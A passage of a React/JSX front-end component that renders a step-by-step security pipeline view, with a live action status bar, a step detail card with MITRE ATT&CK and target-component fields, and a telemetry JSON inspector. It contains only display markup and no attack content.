                      {isActive ? "ACTIVE" : isPast ? "PASSED" : "IDLE"}
                    </span>
                  </div>

                  <div>
                    <h4 className="text-xs font-semibold text-zinc-100 line-clamp-1 mt-1">{node.label}</h4>
                    <p className="text-[10px] text-zinc-400 font-mono mt-0.5 line-clamp-1">{node.sub}</p>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Bottom Live Execution Status Footbar */}
          <div className="mt-4 pt-3 border-t border-zinc-800/80 flex items-center justify-between text-xs font-mono bg-[#07080b] p-3 rounded-lg border border-zinc-800/60">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
              <span className="text-zinc-400">Current Action:</span>
              <span className="text-white font-medium truncate max-w-[280px]">{currentStep.actionTaken}</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-zinc-500">Confidence:</span>
              <span className="text-emerald-400 font-bold">{currentStep.confidenceScore}%</span>
            </div>
          </div>

        </div>

        {/* RIGHT COLUMN: Detailed Step Breakdown & Payload Inspector (5 Cols) */}
        <div className="lg:col-span-5 space-y-4">
          
          {/* Step Detail Card */}
          <div className="bg-[#111319] border border-zinc-800 rounded-xl p-5 shadow-lg space-y-4">
            
            <div className="flex items-start justify-between gap-3 border-b border-zinc-800/80 pb-3">
              <div>
                <span className="text-[11px] font-mono font-semibold uppercase text-indigo-400">
                  {currentStep.stageName}
                </span>
                <h3 className="text-base font-bold text-white mt-0.5">{currentStep.title}</h3>
              </div>
              <span className={`px-2.5 py-1 rounded text-xs font-mono font-bold ${getStatusColor(currentStep.status)}`}>
                {currentStep.status}
              </span>
            </div>

            {/* Description & Technical Breakdown */}
            <div className="space-y-2 text-xs">
              <p className="text-zinc-300 leading-relaxed font-sans">{currentStep.description}</p>
              <div className="bg-[#090a0d] p-3 rounded-lg border border-zinc-800/80 font-mono text-[11px] text-indigo-200">
                <span className="text-zinc-500 block mb-1">Technical Execution Detail:</span>
                {currentStep.technicalDetail}
              </div>
            </div>

            {/* MITRE ATT&CK & Action Badge */}
            <div className="grid grid-cols-2 gap-2 text-xs font-mono pt-1">
              <div className="bg-[#090a0d] p-2.5 rounded-lg border border-zinc-800/60">
                <span className="text-[10px] text-zinc-500 block">MITRE ATT&amp;CK:</span>
                <span className="text-amber-300 font-semibold">{currentStep.mitreCode}</span>
              </div>
              <div className="bg-[#090a0d] p-2.5 rounded-lg border border-zinc-800/60">
                <span className="text-[10px] text-zinc-500 block">Target Component:</span>
                <span className="text-indigo-300 font-semibold">{currentStep.component}</span>
              </div>
            </div>

            {/* Telemetry Inspector Code Box */}
            <div className="pt-2">
              <div className="flex items-center justify-between text-xs font-mono text-zinc-400 mb-1.5">
                <span className="flex items-center gap-1.5">
                  <Terminal className="w-3.5 h-3.5 text-indigo-400" />
                  Live Step Telemetry Payload
                </span>
                <span className="text-[10px] text-emerald-400">JSON Verified</span>
              </div>

              <pre className="bg-[#07080a] p-3 rounded-lg border border-zinc-800 text-[11px] font-mono text-zinc-300 overflow-x-auto max-h-[160px] leading-relaxed">
                <code>{currentStep.telemetrySnippet}</code>
              </pre>
            </div>

          </div>

        </div>

      </div>

    </div>
  );
}
